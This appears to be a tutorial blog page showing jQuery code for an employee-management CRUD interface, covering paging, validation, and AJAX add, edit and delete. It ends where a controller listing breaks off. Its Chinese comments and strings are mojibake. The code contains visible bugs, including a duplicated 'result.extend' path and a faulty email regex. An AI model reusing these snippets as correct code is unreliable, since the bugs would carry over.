//è§£ææ˜¾ç¤ºåˆ†é¡µæ¡,ç‚¹å‡»åˆ†é¡µè¦èƒ½å»ä¸‹ä¸€é¡µç­‰ç­‰....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©º</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("é¦–é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            prePageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            firstPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            prePageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum-1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ„å»ºå…ƒç´ </span></span><br><span class="line"><span class="xml">        var nextPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;raquo;"));</span></span><br><span class="line"><span class="xml">        var lastPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("æœ«é¡µ").attr("href","#"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasNextPage == false)&#123;</span></span><br><span class="line"><span class="xml">            nextPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            lastPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            //ä¸ºå…ƒç´ æ·»åŠ ç‚¹å‡»ç¿»é¡µçš„äº‹ä»¶</span></span><br><span class="line"><span class="xml">            nextPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pageNum+1);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            lastPageLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(result.extend.pageInfo.pages);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æ·»åŠ é¦–é¡µå’Œå‰ä¸€é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(firstPageLi).append(prePageLi);</span></span><br><span class="line"><span class="xml">        //1,2,3....éå†ç»™ulä¸­æ·»åŠ é¡µç æç¤º</span></span><br><span class="line"><span class="xml">        $.each(result.extend.pageInfo.navigatepageNums,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var numLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append(item));</span></span><br><span class="line"><span class="xml">            if(result.extend.pageInfo.pageNum == item)&#123;</span></span><br><span class="line"><span class="xml">                numLi.addClass("active");</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">            numLi.click(function () &#123;</span></span><br><span class="line"><span class="xml">                to_page(item);</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">            ul.append(numLi);</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //æ·»åŠ åä¸€é¡µå’Œæœ«é¡µçš„æç¤º</span></span><br><span class="line"><span class="xml">        ul.append(nextPageLi).append(lastPageLi);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //æŠŠulåŠ å…¥åˆ°navå…ƒç´ ä¸­</span></span><br><span class="line"><span class="xml">        var navEle = $("<span class="tag">&lt;<span class="name">nav</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span>").append(ul);</span></span><br><span class="line"><span class="xml">        navEle.appendTo("#page_nav_area");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ¸…ç©ºè¡¨å•æ ·å¼åŠå†…å®¹</span></span><br><span class="line"><span class="xml">    function reset_form(ele)&#123;</span></span><br><span class="line"><span class="xml">        $(ele)[0].reset();</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºæ ·å¼</span></span><br><span class="line"><span class="xml">        $(ele).find("*").removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).find(".help-block").text("");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //ç‚¹å‡»æ–°å¢æŒ‰é’®å¼¹å‡ºæ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">    $("#emp_add_modal_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…é™¤æ•°æ®ï¼Œè¡¨å•é‡ç½®</span></span><br><span class="line"><span class="xml">        reset_form($("#empAddModal form"));</span></span><br><span class="line"><span class="xml">        //å‘é€ajaxè¯·æ±‚ï¼ŒæŸ¥å‡ºéƒ¨é—¨ä¿¡æ¯ï¼Œæ˜¾ç¤ºåœ¨ä¸‹æ‹‰åˆ—è¡¨</span></span><br><span class="line"><span class="xml">        getDepts("#empAddModal select");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //å¼¹å‡ºæ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">        $("#empAddModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æŸ¥å‡ºæ‰€æœ‰çš„éƒ¨é—¨ä¿¡æ¯å¹¶æ˜¾ç¤ºåœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­</span></span><br><span class="line"><span class="xml">    function getDepts(ele) &#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºä¹‹å‰ä¸‹æ‹‰åˆ—è¡¨çš„å€¼</span></span><br><span class="line"><span class="xml">        $(ele).empty();</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">           url:"$&#123;APP_PATH&#125;/depts",</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                // console.log(result)</span></span><br><span class="line"><span class="xml">                //æ˜¾ç¤ºéƒ¨é—¨ä¿¡æ¯åœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­</span></span><br><span class="line"><span class="xml">                // $("#dept_add_select").append("")</span></span><br><span class="line"><span class="xml">                $.each(result.extend.depts,function () &#123;</span></span><br><span class="line"><span class="xml">                    var optionEle = $("<span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span>").append(this.deptName).attr("value",this.deptId);</span></span><br><span class="line"><span class="xml">                    optionEle.appendTo(ele)</span></span><br><span class="line"><span class="xml">                &#125;);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ ¡éªŒè¡¨å•æ•°æ®</span></span><br><span class="line"><span class="xml">    function validata_add_form()&#123;</span></span><br><span class="line"><span class="xml">        //1. æ‹¿åˆ°è¦æ£€éªŒçš„æ•°æ®ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line"><span class="xml">        var empName = $("#empName_add_input").val();</span></span><br><span class="line"><span class="xml">        var regName = /(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\u2E80-\u9FFF]&#123;2,5&#125;)/;</span></span><br><span class="line"><span class="xml">        if(!regName.test(empName))&#123;</span></span><br><span class="line"><span class="xml">            // alert("ç”¨æˆ·åå¯ä»¥æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ");</span></span><br><span class="line"><span class="xml">            //æ¸…ç©ºè¿™ä¸ªå…ƒç´ ä¹‹å‰çš„æ ·å¼</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","error","ç”¨æˆ·åå¯ä»¥æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#empName_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //2. æ ¡éªŒé‚®ç®±ä¿¡æ¯</span></span><br><span class="line"><span class="xml">        var email = $("#email_add_input").val();</span></span><br><span class="line"><span class="xml">        var regEmaill = /^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/ ;</span></span><br><span class="line"><span class="xml">        if(!regEmaill.test(email))&#123;</span></span><br><span class="line"><span class="xml">            // alert("é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","error","é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_add_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        return true;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ˜¾ç¤ºæ ¡éªŒä¿¡æ¯</span></span><br><span class="line"><span class="xml">    function show_validate_msg(ele,status,msg)&#123;</span></span><br><span class="line"><span class="xml">        //æ¸…ç©ºè¿™ä¸ªå…ƒç´ ä¹‹å‰çš„æ ·å¼</span></span><br><span class="line"><span class="xml">        $(ele).parent().removeClass("has-success has-error");</span></span><br><span class="line"><span class="xml">        $(ele).next("span").text("");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        if(status == "success")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-success");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;else if(status == "error")&#123;</span></span><br><span class="line"><span class="xml">            $(ele).parent().addClass("has-error");</span></span><br><span class="line"><span class="xml">            $(ele).next("span").text(msg);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //æ ¡éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line"><span class="xml">    $("#empName_add_input").change(function () &#123;</span></span><br><span class="line"><span class="xml">        //å‘é€ajaxè¯·æ±‚æ ¡éªŒç”¨æˆ·åæ˜¯å¦å¯ç”¨</span></span><br><span class="line"><span class="xml">        var empName = this.value;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/checkUser",</span></span><br><span class="line"><span class="xml">            data:"empName="+empName,</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                if(result.code == 200)&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","success","ç”¨æˆ·åå¯ç”¨");</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","success");</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    show_validate_msg("#empName_add_input","error",result.extend.va_msg);</span></span><br><span class="line"><span class="xml">                    $("#emp_save_btn").attr("ajax-va","error");</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //ç‚¹å‡»ä¿å­˜ï¼Œä¿å­˜å‘˜å·¥</span></span><br><span class="line"><span class="xml">    $("#emp_save_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //1.æ¨¡æ€æ¡†ä¸­å¡«å†™çš„è¡¨å•æ•°æ®æäº¤ç»™æœåŠ¡å™¨è¿›è¡Œä¿å­˜</span></span><br><span class="line"><span class="xml">        //2.å…ˆå¯¹è¦æäº¤ç»™æœåŠ¡å™¨çš„æ•°æ®è¿›è¡Œæ ¡éªŒ</span></span><br><span class="line"><span class="xml">        if(!validata_add_form())&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //3.åˆ¤æ–­ä¹‹å‰çš„ajaxç”¨æˆ·åæ ¡éªŒæ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="xml">        if($(this).attr("ajax-va")=="error")&#123;</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;;</span></span><br><span class="line"><span class="xml">        //4.å‘é€ajaxè¯·æ±‚ä¿å­˜å‘˜å·¥</span></span><br><span class="line"><span class="xml">        // alert($("#empAddModal form").serialize());</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emp",</span></span><br><span class="line"><span class="xml">            type:"POST",</span></span><br><span class="line"><span class="xml">            data:$("#empAddModal form").serialize(),</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                //alert(result.msg);</span></span><br><span class="line"><span class="xml">                if(result.code == 200)&#123;</span></span><br><span class="line"><span class="xml">                    //å‘˜å·¥ä¿å­˜æˆåŠŸï¼š</span></span><br><span class="line"><span class="xml">                    //1. å…³é—­æ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">                    $("#empAddModal").modal('hide');</span></span><br><span class="line"><span class="xml">                    //2. æ¥åˆ°æœ€åä¸€é¡µï¼Œæ˜¾ç¤ºåˆšæ‰ä¿å­˜çš„æ•°æ®</span></span><br><span class="line"><span class="xml">                    //å‘é€ajaxè¯·æ±‚æ˜¾ç¤ºæœ€åä¸€é¡µæ•°æ®å³å¯</span></span><br><span class="line"><span class="xml">                    //å¯ä»¥å°†æ€»è®°å½•æ•°å½“ä½œé¡µç </span></span><br><span class="line"><span class="xml">                    to_page(totalRecords);</span></span><br><span class="line"><span class="xml">                &#125;else&#123;</span></span><br><span class="line"><span class="xml">                    //æ˜¾ç¤ºå¤±è´¥ä¿¡æ¯</span></span><br><span class="line"><span class="xml">                    // console.log(result);</span></span><br><span class="line"><span class="xml">                    //æœ‰å“ªä¸ªå­—æ®µçš„é”™è¯¯ä¿¡æ¯ï¼Œå°±æ˜¾ç¤ºå“ªä¸ªå­—æ®µ</span></span><br><span class="line"><span class="xml">                    if(undefined != result.extend.errorFields.email)&#123;</span></span><br><span class="line"><span class="xml">                        //æ˜¾ç¤ºé‚®ç®±é”™è¯¯ä¿¡æ¯</span></span><br><span class="line"><span class="xml">                        show_validate_msg("#email_add_input","error",result.extend.errorFields.email);</span></span><br><span class="line"><span class="xml">                    &#125;</span></span><br><span class="line"><span class="xml">                    if(undefined != result.extend.errorFields.empName)&#123;</span></span><br><span class="line"><span class="xml">                        //æ˜¾ç¤ºå‘˜å·¥é”™è¯¯ä¿¡æ¯</span></span><br><span class="line"><span class="xml">                        show_validate_msg("#empName_add_input","error",result.extend.result.extend.errorFields.empName);</span></span><br><span class="line"><span class="xml">                    &#125;</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //1.æŒ‰é’®åˆ›å»ºä¹‹å‰å°±ç»‘å®šäº†clickï¼Œæ‰€ä»¥ç»‘å®šä¸ä¸Š</span></span><br><span class="line"><span class="xml">    //1).å¯ä»¥åœ¨åˆ›å»ºæŒ‰é’®çš„æ—¶å€™ç»‘å®šäº‹ä»¶ 2).live()</span></span><br><span class="line"><span class="xml">    //jqueryæ–°ç‰ˆæ²¡æœ‰liveï¼Œä½¿ç”¨onæ–¹æ³•è¿›è¡Œæ›¿ä»£</span></span><br><span class="line"><span class="xml">    $(document).on("click",".edit_btn",function () &#123;</span></span><br><span class="line"><span class="xml">      //alert("edit")</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //1.æŸ¥å‡ºéƒ¨é—¨ä¿¡æ¯ï¼Œå¹¶æ˜¾ç¤ºéƒ¨é—¨åˆ—è¡¨</span></span><br><span class="line"><span class="xml">        getDepts("#empUpdateModal select");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //2.æŸ¥å‡ºå‘˜å·¥ä¿¡æ¯ï¼Œæ˜¾ç¤ºå‘˜å·¥ä¿¡æ¯</span></span><br><span class="line"><span class="xml">        getEmp($(this).attr("edit-id"));</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //3.æŠŠå‘˜å·¥çš„idä¼ é€’ç»™æ¨¡æ€æ¡†çš„æ›´æ–°æŒ‰é’®</span></span><br><span class="line"><span class="xml">        $("#emp_update_btn").attr("edit-id",$(this).attr("edit-id"));</span></span><br><span class="line"><span class="xml">        $("#empUpdateModal").modal(&#123;</span></span><br><span class="line"><span class="xml">            backdrop:"static"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function getEmp(id) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emp/"+id,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                var empData = result.extend.emp;</span></span><br><span class="line"><span class="xml">                $("#empName_update_static").text(empData.empName);</span></span><br><span class="line"><span class="xml">                $("#email_update_input").val(empData.email);</span></span><br><span class="line"><span class="xml">                $("#empUpdateModal input[name=gender]").val([empData.gender]);</span></span><br><span class="line"><span class="xml">                $("#empUpdateModal select").val([empData.dId]);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //ç‚¹å‡»æ›´æ–°ï¼Œæ›´æ–°å‘˜å·¥ä¿¡æ¯</span></span><br><span class="line"><span class="xml">    $("#emp_update_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //1.éªŒè¯é‚®ç®±æ˜¯å¦åˆæ³•</span></span><br><span class="line"><span class="xml">        var email = $("#email_update_input").val();</span></span><br><span class="line"><span class="xml">        var regEmaill = /^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$/ ;</span></span><br><span class="line"><span class="xml">        if(!regEmaill.test(email))&#123;</span></span><br><span class="line"><span class="xml">            // alert("é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_update_input","error","é‚®ç®±æ ¼å¼ä¸æ­£ç¡®");</span></span><br><span class="line"><span class="xml">            return false;</span></span><br><span class="line"><span class="xml">        &#125;else&#123;</span></span><br><span class="line"><span class="xml">            show_validate_msg("#email_update_input","success","");</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">        //2.å‘é€ajaxè¯·æ±‚ï¼Œä¿å­˜æ›´æ–°çš„å‘˜å·¥æ•°æ®</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emp/"+$(this).attr("edit-id"),</span></span><br><span class="line"><span class="xml">            type:"PUT",</span></span><br><span class="line"><span class="xml">            data:$("#empUpdateModal form").serialize(),</span></span><br><span class="line"><span class="xml">            success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                //alert(result.msg);</span></span><br><span class="line"><span class="xml">                //1.å…³é—­æ¨¡æ€æ¡†</span></span><br><span class="line"><span class="xml">                $("#empUpdateModal").modal("hide");</span></span><br><span class="line"><span class="xml">                //2.å›åˆ°æœ¬é¡µé¢</span></span><br><span class="line"><span class="xml">                to_page(currentPage);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //å•ä¸ªåˆ é™¤</span></span><br><span class="line"><span class="xml">    $(document).on("click",".delete_btn",function () &#123;</span></span><br><span class="line"><span class="xml">        //1.å¼¹å‡ºç¡®è®¤åˆ é™¤å¯¹è¯æ¡†</span></span><br><span class="line"><span class="xml">        var empName = $(this).parents("tr").find("td:eq(2)").text();</span></span><br><span class="line"><span class="xml">        var empId = $(this).attr("del-id");</span></span><br><span class="line"><span class="xml">        //alert($(this).parents("tr").find("td:eq(1)").text());</span></span><br><span class="line"><span class="xml">        if(confirm("ç¡®è®¤åˆ é™¤["+empName+"]å—ï¼Ÿ"))&#123;</span></span><br><span class="line"><span class="xml">            //ç¡®è®¤ï¼Œå‘é€ajaxè¯·æ±‚åˆ é™¤å³å¯</span></span><br><span class="line"><span class="xml">            $.ajax(&#123;</span></span><br><span class="line"><span class="xml">               url:"$&#123;APP_PATH&#125;/emp/"+empId,</span></span><br><span class="line"><span class="xml">                type:"DELETE",</span></span><br><span class="line"><span class="xml">                success:function (result) &#123;</span></span><br><span class="line"><span class="xml">                    alert(result.msg);</span></span><br><span class="line"><span class="xml">                    //å›åˆ°æœ¬é¡µ</span></span><br><span class="line"><span class="xml">                    to_page(currentPage);</span></span><br><span class="line"><span class="xml">                &#125;</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //å®Œæˆå…¨é€‰/å…¨ä¸é€‰</span></span><br><span class="line"><span class="xml">    $("#check_all").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //attrè·å–checkedæ˜¯undefined</span></span><br><span class="line"><span class="xml">        //æˆ‘ä»¬è¿™äº›domåŸç”Ÿçš„å±æ€§,attrè·å–è‡ªå®šä¹‰å±æ€§çš„å€¼</span></span><br><span class="line"><span class="xml">        //propä¿®æ”¹å’Œè¯»å–domåŸç”Ÿå±æ€§çš„å€¼</span></span><br><span class="line"><span class="xml">       $(".check_item").prop("checked",$(this).prop("checked"));</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //åˆ¤æ–­å½“å‰é€‰æ‹©ä¸­çš„å…ƒç´ æ˜¯å¦5ä¸ª</span></span><br><span class="line"><span class="xml">    $(document).on("click",".check_item",function () &#123;</span></span><br><span class="line"><span class="xml">        var flag = $(".check_item:checked").length == $(".check_item").length;</span></span><br><span class="line"><span class="xml">        $("#check_all").prop("checked",flag);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //ç‚¹å‡»å…¨éƒ¨åˆ é™¤ï¼Œå°±æ‰¹é‡åˆ é™¤</span></span><br><span class="line"><span class="xml">    $("#emp_delete_all_btn").click(function () &#123;</span></span><br><span class="line"><span class="xml">        //$(".check_item:checked")</span></span><br><span class="line"><span class="xml">        var empNames = "";</span></span><br><span class="line"><span class="xml">        var del_idstr = "";</span></span><br><span class="line"><span class="xml">        $.each($(".check_item:checked"),function () &#123;</span></span><br><span class="line"><span class="xml">           //this</span></span><br><span class="line"><span class="xml">            empNames += $(this).parents("tr").find("td:eq(2)").text()+"ï¼Œ";</span></span><br><span class="line"><span class="xml">            //ç»„è£…å‘˜å·¥idå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="xml">            del_idstr += $(this).parents("tr").find("td:eq(1)").text()+"-"</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">        //å»é™¤empNameså¤šä½™çš„,</span></span><br><span class="line"><span class="xml">        empNames = empNames.substring(0,empNames.length-1);</span></span><br><span class="line"><span class="xml">        //å»é™¤åˆ é™¤çš„idå¤šä½™çš„-</span></span><br><span class="line"><span class="xml">        del_idstr = del_idstr.substring(0,del_idstr.length-1);</span></span><br><span class="line"><span class="xml">        if(confirm("ç¡®è®¤åˆ é™¤["+empNames+"]å—ï¼Ÿ"))&#123;</span></span><br><span class="line"><span class="xml">            //å‘é€ajaxè¯·æ±‚</span></span><br><span class="line"><span class="xml">            $.ajax(&#123;</span></span><br><span class="line"><span class="xml">               url:"$&#123;APP_PATH&#125;/emp/"+del_idstr,</span></span><br><span class="line"><span class="xml">               type:"DELETE",</span></span><br><span class="line"><span class="xml">               success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                   alert(result.msg);</span></span><br><span class="line"><span class="xml">                   //å›åˆ°å½“å‰é¡µé¢</span></span><br><span class="line"><span class="xml">                   to_page(currentPage);</span></span><br><span class="line"><span class="xml">               &#125;</span></span><br><span class="line"><span class="xml">            &#125;);</span></span><br><span class="line"><span class="xml">        &#125;</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>æœ€åçš„EmployeeController<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 